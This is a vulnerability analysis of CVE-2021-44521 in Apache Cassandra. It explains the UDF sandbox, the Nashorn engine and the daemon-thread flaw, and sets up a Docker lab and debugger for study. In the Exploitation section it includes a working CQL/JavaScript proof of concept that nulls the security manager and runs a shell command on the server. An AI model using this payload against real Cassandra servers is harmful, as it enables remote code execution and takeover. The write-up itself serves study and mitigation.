# **Introduction**

`CVE-2021-44521` is a vulnerability discovered in Apache Cassandra which allow an attacker to achieve remote command execution through `UDFS` & bypass the sandbox to execute the code on the server under specific configurations which let the attacker to takeover the server.

**CVSS**:(Critical) https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44521&vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1&source=NIST

# **What is Apache Cassandra ?**

Apache Cassandra is an open-source distributed NoSQL database management system, Cassandra is highly scalable and can handle large amounts of structured, semi-structured, and unstructured data across multiple data centers, making it a popular choice for big data applications. It uses a decentralized architecture, with no master node, which allows for linear scalability and fault tolerance. Also, It's highly tunable and configurable, allowing developers to adjust the system to their specific use case and workload.

## **CQL**

`CQL` is a short for Cassandra Query Language, Which is a query language similar to `SQL`, but optimized for distributed database environments with support for secondary indexes, materialized views, and batch operations, among other features.

## **UDFs**

`UDFs` is a short for User-Defined Functions which are functions that can be created and executed by users within a database management system. In our case, Cassandra offers the functionality of creating user-defined-functions (`UDFs`) & the `UDFs` in Cassandra can be written by default in `Java` and `JavaScript`.

## **Nashorn**

`Nashorn` is a `JavaScript` engine that was introduced in `Java 8` and it allows users to execute `JavaScript` code within a sanbox & It can be used to create and execute `JavaScript` based `UDFs` in `Java` based database management systems by executing it inside of a sandbox.

# **Testing Lab**

Now, Let's setup our testing lab for analysis & We gonna be using Cassandra `4.0.0`, But we need to do some modification for the configuration file within the container and create a new image from it then start a container based on our modified one. First we will pull the Cassandra image:

```
docker pull cassandra:4.0.0
```

![](/assets/images/4e48f7fb0bcb7601b3d50ae95856f241)

Now let's run `cassandra` container:

```
sudo docker run --name my-cassandra-analysis -d cassandra:4.0.0
```

![](/assets/images/279caa6bf30e49c92663a8a04213b697)

Let's check if the container is running:

```
sudo docker ps -a
```

![](/assets/images/78422d0d49f36ee79c5e874b19a563d3)

We can see the container is running, Now, Let's open a shell to it and start our modifications:

```
sudo docker exec -it CONTAINER_ID bash
```

![](/assets/images/c0544de11f6a01b245f0b7e19f7cd071)

Now, Under `/opt/cassandar` we can find the `cassandra.yaml`:

![](/assets/images/fb99be5ad770e4ecaca227408490cb3c)

Let's open `cassandra.yaml` and modifiy & add the following lines:

```
enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
```

After this save the file and exit the shell. And the time for creating image from our container is came:

```
sudo docker commit my-cassandra-4.0.0 cassandra-analysis:latest 
```

![](/assets/images/8c55a768fbfde7a5c8f91b2a58e9284a)

Now, Everything is ready let's stop the continer and run a new one using our modified image:

```
sudo docker run --name my-cassandra-analysis -e "JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n" -p 8000:8000 -d cassandra-analysis:latest
```

![](/assets/images/1949302dab0ed264b527c58bcc225a28)

The `-e JAVA_TOOL_OPTIONS="-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n"` is to set a debugging port, So we can perform our dynamic analysis later and the `-p 8000:8000` to map the external connections of port `8000` into the container. Now, If we execute shell on the container & try to see the configuration file of `cassandra.yaml` we can see our modified configurations applied:

![](/assets/images/193792029a8eaa358e5572128076b53c)

# **Static Analysis**

If we go again to `cassandra.yaml` file we can be able to see that the anonymous access is allowed as `authenticator` config is set as the following:

```
authenticator: AllowAllAuthenticator
```

And if we go to the cassandra source code we can find a call called `AllowAllAuthenticator` under the following path `/src/java/org/apache/cassandra/auth`, Let's take a look and check it out:

```
public class AllowAllAuthenticator implements IAuthenticator
{
    private static final SaslNegotiator AUTHENTICATOR_INSTANCE = new Negotiator();

    public boolean requireAuthentication()
    {
        return false;
    }

    public Set<IResource> protectedResources()
    {
        return Collections.emptySet();
    }

    public void validateConfiguration() throws ConfigurationException
    {
    }

    public void setup()
    {
    }

    public SaslNegotiator newSaslNegotiator(InetAddress clientAddress)
    {
        return AUTHENTICATOR_INSTANCE;
    }

    public AuthenticatedUser legacyAuthenticate(Map<String, String> credentialsData)
    {
        return AuthenticatedUser.ANONYMOUS_USER;
    }

    private static class Negotiator implements SaslNegotiator
    {

        public byte[] evaluateResponse(byte[] clientResponse) throws AuthenticationException
        {
            return null;
        }

        public boolean isComplete()
        {
            return true;
        }

        public AuthenticatedUser getAuthenticatedUser() throws AuthenticationException
        {
            return AuthenticatedUser.ANONYMOUS_USER;
        }
    }
}
```

The class implements the `IAuthenticator` interface which is responsible for authenticating clients connecting to `cassandra`, the class providing a simple authentication mechanism that allows all connections without need for any credentials, In short words, `Anonymous` authentication.Let's see the intreasted functions as steps happen as the following The `requireAuthentication()` function indicates whether authentication is required or no. In this case, it returns false which means authentication is not required. Then `protectedResources()` method returns a set of protected resources & since there is no authentication it returns an empty set. After that `legacyAuthenticate()` function is used for legacy authentication and It accepts credentials data and returns an `AuthenticatedUser` instance. In this case, it always returns the `ANONYMOUS_USER` from the `AuthenticatedUser` class. Now, If we try to access `cassandra` we will be able to see that we logged-in without any asking for credentials:

![](/assets/images/3858629ccfcedc7cf5e093e1c6be25dc)

&nbsp;

Here we can see we are on `cassandra` without any asking for credentials. Now, Back to our configurationsm Let's explain each option in the configurations we apply to understand it more clearly.

### enable\_user\_defined\_functions & enable\_scripted\_user\_defined\_functions

The `enable_user_defined_functions` & `enable_scripted_user_defined_functions` options are for enabling the support of `UDFs` in both `Java` and `Javascript`. Now, If we go to `src/java/org/apache/cassandra/cql3/functions/UDFunction.java` and take a look on the `UDFs` get implementaion. The `UDFunction` class provides methods for validating the `UDFs` configuration and parameters and ensure that the function definition is correct and compatible with the expected data types.

![](/assets/images/9708f73eaa11b3c08e743d9bb1a8e846)

&nbsp;

Here first we can see that `UDFunction` class is declared as abstract and extends the `AbstractFunction` class & implements the `ScalarFunction` and `SchemaElement` interfaces. Them, defines a variable called `logger` from `LoggerFactory` to log messages, After that a `threadMXBean` variable that provides access to the thread management and monitoring `MXBean`. Finally, Declaring the follwoing variables:

- `argNames`: A list of ColumnIdentifier objects representing the names of the function arguments.
    
- `language` and `body`: Strings representing the language and body of the user-defined function.
    
- `argCodecs`: An array of `TypeCodec` Object representing the argument codecs for the function.
    
- `returnCodec`: A `TypeCodec` Object representing the return codec for the function.
    
- `calledOnNullInput`: A boolean indicating whether the function is called on null input.
    
- `udfContext`: A variable of type `UDFContext` which provides context information for the `UDF`.
    

![](/assets/images/2548bf65b8b4b70373b9d3564aa426f0)

By scrolling more down we can find here a variable named `allowedPatterns` which is an array used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the allowed classes/resources that can be loaded by the class loader. Moving to the following lines:

![](/assets/images/284989788656563947404a49b206906f)

&nbsp;

Here we can see a variable named `disallowedPatterns` which is an array used for the opposite process of `allowedPatterns`, Which here the `disallowedPatterns` used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the disallowed classes/resources that can't be loaded by the class loader.

![](/assets/images/fc7261fecefb84ec6c258103720be7e4)

&nbsp;

In the next lines we can see the following clearly, This is a static function named `secureResource` & basically, it's used to determine whether a given resource is considered secure based on the allowed and disallowed patterns specified in the `allowedPatterns` and `disallowedPatterns` arrays. First, the function takes a parameter named `resource` and as we can guess it will be the required resources to be loaded, After that defines a `While` loop to remove forward slashes `/` from the resource string by repeatedly calling `substring(1)` until the forward slashes are eliminated, Then a `for-each` loop happens to iterate through the `allowedPatterns` array to check if the `resource` starts with any of the allowed patterns and If the resource starts with an allowed pattern it will proceed to check if it is explicitly disallowed by iterating through `disallowedPatterns` array to make sure there is no manipulation in the `resource` is being used for a bypass. Finally, If the the `resource` patterns is disallowed it will return `false` with a massage indicating access denial for the resource, If not, then it will return `true` indicating that the `resource` is considered secure.

![](/assets/images/2a8983585a56e16eaef81acbc93402d3)

&nbsp;

In the above lines in the screenshot, It's creating a new `ClassLoader` Object named `udfClassLoader` and initializes it with a new instance of the `UDFClassLoader` class, After that it invokes a constructor named `UDFunction` which create and initialize a `UDF`, The function takes the following parameters:

- `name`: A `FunctionName` object representing the name of the `UDF`.
    
- `argNames`: A list of `ColumnIdentifier` objects representing the names of the function arguments.
    
- `argTypes`: A list of `AbstractType` objects representing the types of the function arguments.
    
- `returnType`: An `AbstractType` object representing the return type of the function.
    
- `alledOnNullInput`: A boolean indicating whether the function is called on null input.
    
- `language`: A string representing the language of the `UDF`, Wethier is `Java` or `JavaScritp`.
    
- `body`: A string representing the body of the `UDF`.
    

Then, it passes the provided parameters to the other constructor and the `UDHelper.driverType` method is called with the `returnType` parameter to convert the return type into the corresponding driver type using another helper method.

![](/assets/images/fbee556e290b240a17e0921a2cffc5a7)

In the next lines, Here we can see it invokes a second constructor with the same parameters. After that it invokes the constructor of the superclass `AbstractFunction` with `name`, `argTypes`, and `returnType` parameters, Then performs an assertion check to ensure that the `argNames` list does not contain any duplicate entries. After That, assigning the variables to instance variables of the class. Finally, It retrieves the metadata for the keyspace specified in the name parameter using the `getKeyspaceMetadata` method of the `Schema.instance` object and creates a new instance of the `UDFContextImpl` class & pass the `argNames`, `argCodecs`, `returnCodec`, and `keyspaceMetadata` parameters and The results object is assigned to the `udfContext` instance variable.

![](/assets/images/293b4f215b0ef9f3b3b89022d505c663)

&nbsp;

Now, We arrived to the funny part in the code where it try to create the `UDF`. The `tryCreate` method will take the parameters we mentioned before and try to to create the `UDF` by passing it to `create()` function. If we scroll down to take a look at the function we can see it as the following:

![](/assets/images/dba600a3230887c9d1c09d7739f8a62a)

&nbsp;

The function has a `switch` statment to check the language of the `UDF`, If it's `Java`, Then it will create the `UDF` using the `JavaBasedUDFunction()` function which can be found as `src/java/org/apache/cassandra/cql3/functions/JavaBasedUDFunction.java` class which represent the `UDF` implemention in `Java`,If not then it will create it using `ScriptBasedUDFunction()` function which can be found as `src/java/org/apache/cassandra/cql3/functions/ScriptBasedUDFunction.java` class which represent the `UDF` implemention in scripting languages as `JavaScript`. If we go to the `ScriptBasedUDFunction.java` class we will be able to see the `Nashron` sandbox implemention, Let's discover the class to make everything more clear.

![](/assets/images/9ad0dc1bf1b8aa5bacda240b6b948ef4)

&nbsp;

The class starts with the declaration of two variables `protectionDomain` and `accessControlContext`, `ProtectionDomain` holds information about the protection domain of the class and `AccessControlContext` represents the access control context for the class.

![](/assets/images/8592c862db692dd2d731c20f17806904)

&nbsp;

Here it defines the `allowedPackagesArray` variable which is an array of strings representing the allowed packages for the `Nashorn` script engine. These allowed packages determine which packages and classes are accessible within the sandboxed environment for executing the `UDFs` and this inclusion of specific packages ensures that necessary classes and functionalities required by the scripts and the environment are accessible while maintaining security and preventing unauthorized access to sensitive classes or resources.

![](/assets/images/b8f95ec5698e02707ed0fb55dca7a293)

&nbsp;

When we scroll down we can notice The `UDFExecutorService` which is a custom executor service used for executing the `UDFs` and It takes parameters such as a named thread factory, a class loader `udfClassLoader`, a security thread group & a thread initialization function `UDFunction::initializeThread` . After that out of the executor we can notice the `NashornScriptEngine` declering and `ClassFilter` which is an interface used by the `Nashorn` script engine.

![](/assets/images/91d77702582615e545a74a34714fa047)

&nbsp;

As we move to the next lines we can see a static block where the `nashorn` get initialized. First, It creates an instance of `ScriptEngineManager` and named as `scriptEngineManager`. Then, It retrieves `Nashorn` script engine into `engine` variable which is a `ScriptEngine` object. After that it checks if the `engine` variable is not `null`, If it's not `null` it casts the factory of the script engine to `NashornScriptEngineFactory`, if it's `null` it assigns `null` to the `factory` variable. Followed by checking if the factory is not `null`. If it's not `null` it will create a new `Nashorn` script engine using the factory `getScriptEngine` method and pass empty string array, `udfClassLoader` as the class loader & the `classFilter` as the class filter which defined in the above lines wie discuss before. The `AccessControlContext` encapsulates the context in which a set of permissions is checked for access control decisions.

![](/assets/images/de7c6eadb26da08c410758670434512a)

&nbsp;

Here a constructor initializes a `ScriptBasedUDFunction` instance by compiling the script, performing necessary checks & security measures and setting up the execution context. First it checks if the language specified is `JavaScript` and if the `scriptEngine` is not `null`, If the language is invalid or the `scriptEngine` is `null` it throws an `InvalidRequestException` with an appropriate error message. Then, it attempts to compile the body of the script using the `scriptEngine`and compilation is executed with no permissions to prevent potentially malicious code from running, such as code in `static code blocks` or during class initialization & it's done by using `AccessController.doPrivileged()` with a `PrivilegedExceptionAction` that compiles the script. Finally, `accessControlContext` is used as the access control context for this privileged action If an exception occurs during the compilation process an `InvalidRequestException` is thrown with a formatted error message. After that an instance of `UDFContextWrapper` is created and assigned to the `udfContextBinding` variable and it serves as a binding for the script execution context.

![](/assets/images/66e0e7bd597ad09128ff21b7e4ba16dc)

&nbsp;

In this code section it first returns the `executor` instance which is an `ExecutorService` used for executing tasks asynchronously in the codebase. Then, we have `executeUserDefined()` function prepares the parameters & execute the `UDF` script and converts the result into a `ByteBuffer` to be returned.

![](/assets/images/5ad7c81676d4c43d9719d1b9ad68fe93)

&nbsp;

Then `executeAggregateUserDefined()` function prepares the parameters & call the `executeScriptInternal()` method with the prepared parametersand return the result of executing the `UDF`aggregate function.

## **enable\_user\_defined\_functions\_threads**

The `enable_user_defined_functions_threads` is a configuration option and when it's enabled, `UDF` execution is offloaded to a dedicated thread pool which allowing `UDFs` to be executed concurrently with other queries. And the main problem is here cause when this option is disabled the `UDF` runs in the daemon thread, As a results we has permissions to call `setSecurityManager` which allow us to disable the security manager in cassandra, As a results we will be able to bypass the class filtering and we will be able to include critical or blacklisted calsses to execute codes on the system as when we running the `JS` code in `Nashron` we can access `Nashorn` instance engine, through the access we have to the engine property. We can find the implementation of `SecurityManager` at the following class `src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java` the class is providing a mechanism for controlling and enforcing security permissions in `Cassandra` which allowing fine-grained access control for different operations and resources.

# **Exploitation**

It's the time to see how we can exploit the vulnerability before do our dynamic analysis on it. So, we be able to understand what we are debugging or analysis dynamically.

```
CREATE KEYSPACE test WITH replication = {'class': 'SimpleStrategy', 'replication_factor' : 3};
use test;
CREATE TABLE tab (cmd text PRIMARY KEY) WITH comment='Important biological records';
create or replace function test.exec(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch /tmp/Pwn3d.txt")');name $$;
insert into tab(cmd) values('test');
select exec(cmd) from tab;
```

This `UDF` will run in a daemon thread as the `enable_user_defined_functions_threads` option is disabled, As a results we can have permissions to control `setSecurityManager` and we can see in the `UDF` we set it to null so we can bypass the class filteration & with the access to engine property we create a new engine instance and call `eval()` function from `JS` & finally, Our `JAVA` code in it to execute a command using `Runtime` from `Java`. In our case, The code will create a file named `Pwn3d.txt` under the `/tmp` directory on the server as a `PoC`. Let's Run the `UDF` and check it out:

![](/assets/images/6b7aff97bceb750b4919b7cef5e396bd)

# **Dynamic Analysis**

Now, We under stand how is the `Nashorn` is implemented, How the `UDFs` get executed the security manager & the class filtering mechanism. It's time to see the `UDFs` run in action and in the default settings while we debug it & see the difference dynamically when the security manager is on & When it's off. We already configured the debugger before when we were setting up our testing lab. Note: For debugging people may face problems when debugging on docker, So we gonna build `cassandra` easily and debug it locally from the `kali` machine. First download `Cassandra-4.0.0` from [here](https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0). Now, extract it and install apache `ant`:

```
sudo apt install ant
```

Now, let's build `Cassandra` by using `ant` command:

&nbsp;

![](/assets/images/b3d98949b826e6ded237155502d1cfd8)

&nbsp;

After building is done, Let's enable debugging by exporting the following variable in our environmenrt:

```
export JVM_EXTRA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1414"
```

&nbsp;

![](/assets/images/88aa140a54b34b17a6182319fa21c4b8)

&nbsp;

Before we run the app let's edit the options in `cassandra.yaml` file under the `conf` directory & add the following options:

&nbsp;

![](/assets/images/46966a024e7336f5bf6e2e5b41dc17f6)

  
  
Now, Run `Cassandra` using `./bin/cassandra`:

&nbsp;

![](/assets/images/fc1887398d44f7823e8670b69fca7e10)

&nbsp;

The app is running, go to `Run` Tab and then click on `Edit Configurations`:

&nbsp;

![](/assets/images/1c61f6f4605d01e3ca60d6572b7a7c20)

&nbsp;

Then Click on the `+` add sign and choose `Remote JVM Debug`:

&nbsp;

![](/assets/images/a10d9e442d9dd36639ae044263dc5133)

&nbsp;

And Name it as you want & configure the remote debugger, By adding the machine `IP`, Debugging port which is `1414`:

&nbsp;

![](/assets/images/c44ddbf21db95506cddb437d7c8a54b9)

&nbsp;

Finally, Let's Set the breakpoint on the `private static final UDFExecutorService executor` inside of `src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java` class.

&nbsp;

![](/assets/images/ffdd996f0d8526a238f4e551ad3b29df)

&nbsp;

Now, Let's click on the debugging button

&nbsp;

![](/assets/images/96d9faea99bf7a8f76d33ee09836eb9f)

&nbsp;

&nbsp;

![](/assets/images/f99c6e7b3b0448cd71e1359f443d8612)

&nbsp;

Next, execute our `UDF` again:

&nbsp;

![](/assets/images/d3f17d79c90f76f972c3eb6554419f2d)

&nbsp;

As you can see because we set the `enable_user_defined_functions_threads` otpion to `true`, The `UDF` not running in a daemon thread. Therefor, We don't have the permissions to control `setSecurityManager`. So, We got this execption massege.

&nbsp;

![](/assets/images/7f76716da9a50302d1ef3563905c440d)

&nbsp;

When we go to our debugger here clearly we have the members of `ScriptBasedUDFunction` which are:

```
protectionDomain = null
accessControlContext = null
allowedPackagesArray = {String[34]@7856} ["", "com", "edu", "java", "javax", +29 more]
executor = null
classFilter = null

disallowedPatterns = {String[34]@7860} ["com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", +29 more]
udfClassLoader = {UDFunction$UDFClassLoader@7861} 
$assertionsDisabled = false
NAME_COMPARATOR = {SchemaElement$lambda@7862} 
```

&nbsp;

![](/assets/images/1b14278dcc59dd26c1accba732562d10)

&nbsp;

Here we can see it executed the `ScriptBasedUDFunction()` function under `UDFunction` class implementation as the language is `JavaScript` & We can see that the body is carrying our function:

```
body= var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch /tmp/Pwn3d.txt")');name 
```

&nbsp;

![](/assets/images/83970774c1ba34bce93c34f9fdb1c8e7)

&nbsp;

After that it starts to create our `UDF` using `create` method. And it's passing the needed parameters as the following:

```
this = {CreateFunctionStatement@7887} "CreateFunctionStatement (test, exec)"
 functionName = "exec"

Moving forward it will go to the `src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java` class to start performing the security checks using `isSecuredThread()` that checks if the current thread is a secured thread. Now, Let's disable the `enable_user_defined_functions_threads` and see how the function will get executed while we debugging:

&nbsp;

Then restart `Cassandra` and start to debug, When we start to debug it will do the same previous, But when we arrive here:

&nbsp;

![](/assets/images/08a09c56a095c946e20c59996862b79f)

&nbsp;

it's checking if the current thread is running in a secured thread group `SecurityThreadGroup` and returns `true` if the thread has been previously initialized as secured or `false` if it's not running in a secured thread group or has not been initialized yet. But, In our case it will return `false`.

&nbsp;

Here when it's come to check if the thread results is `true`, Then it will throw execption tells us that access denied. But, This time will not as the the `UDF` running as a daemon thread and we set the `securityManager` to null. As a results it will execute our `UDF` successfully.

# **Mitigation**

The vulnerability is only avlilable under the configurations we configure `Cassandra` on, To mitigate this `CVE` we have to set `enable_user_defined_functions_threads` option to true to prevent the `UDF` from running as a daemon thread & If you not using `UDFs` you better disable it. You can use this remedy script on `Vsociety` from here to help you with that.

# **Conclusion**

In a short way, We analyzed the vulnerability& the root-cause, The `UDFs`, `Nashron`, `SecurityManager` & more. We saw how `UDFs` created and executed & How under a certien configurations the `Cassandra` can be vulnerable for the `CVE`. Finally, How it could be used to bypass all the security implementations and achieve remote code execution on the target host.
